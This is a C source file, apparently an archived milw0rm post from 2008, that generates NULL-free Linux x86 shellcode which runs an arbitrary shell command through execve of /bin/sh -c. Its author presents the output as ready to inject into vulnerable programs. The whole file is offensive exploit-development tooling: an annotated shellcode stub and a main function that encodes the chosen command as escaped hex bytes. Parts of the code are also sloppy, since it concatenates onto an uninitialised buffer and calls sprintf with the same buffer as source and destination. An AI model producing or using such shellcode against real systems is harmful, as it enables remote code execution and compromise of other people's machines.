/**
 *
 * BlackLight's shellcode generator for Linux x86
 * Tested anywhere, working & NULL-free
 *
 * Usage: ./generator <cmd>
 * ...and then you've got a ready2inject NULL-free shellcode for the command you like
 *
 * copyleft 2008 by BlackLight <blacklight[at]autistici.org>
 * < http://blacklight.gotdns.org >
 *
 * Released under GPL v.3 licence
 *
 * Greetz to: evilsocket, for the idea he gave me  ;)
 * Greetz to: my friends, who tested, used and appreciated this code and helped
 *      me to improve it to what it is now
 * Greetz to: my girl, next to me in any moment even if she had no idea
 *      about what I was doing ^^
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char code[] =
      "\\x60"                        /*pusha*/
      "\\x31\\xc0"                   /*xor    %eax,%eax*/
      "\\x31\\xd2"                   /*xor    %edx,%edx*/
      "\\xb0\\x0b"                   /*mov    $0xb,%al*/
      "\\x52"                        /*push   %edx*/
      "\\x68\\x6e\\x2f\\x73\\x68"    /*push   $0x68732f6e*/
      "\\x68\\x2f\\x2f\\x62\\x69"    /*push   $0x69622f2f*/
      "\\x89\\xe3"                   /*mov    %esp,%ebx*/
      "\\x52"                        /*push   %edx*/
      "\\x68\\x2d\\x63\\x63\\x63"    /*push   $0x6363632d*/
      "\\x89\\xe1"                   /*mov    %esp,%ecx*/
      "\\x52"                        /*push   %edx*/
      "\\xeb\\x07"                   /*jmp   804839a <cmd>*/
      "\\x51"                        /*push   %ecx*/
      "\\x53"                        /*push   %ebx*/
      "\\x89\\xe1"                   /*mov    %esp,%ecx*/
      "\\xcd\\x80"                   /*int    $0x80*/
      "\\x61"                        /*popa*/
      "\\xe8\\xf4\\xff\\xff\\xff"    /*call  8048393 <l1>*/;

int main (int argc, char **argv)  {
      int i,len=0;
      char *shell,*cmd;

      if (!argv[1])
              exit(1);

      for (i=1; i<argc; i++)
              len += strlen(argv[i]);
      len += argc;

      cmd = (char*) malloc(len);

      for (i=1; i<argc; i++)  {
              strcat (cmd,argv[i]);
              strcat (cmd,"\x20");
      }

      cmd[strlen(cmd)-1]=0;
      shell = (char*) malloc( sizeof(code) + (strlen(argv[1]))*5 + 1 );
      memcpy (shell,code,sizeof(code));

      for (i=0; i<strlen(cmd); i++)
              sprintf (shell,"%s\\x%.2x",shell,cmd[i]);
      printf ("%s\n",shell);
}

// milw0rm.com [2008-08-19]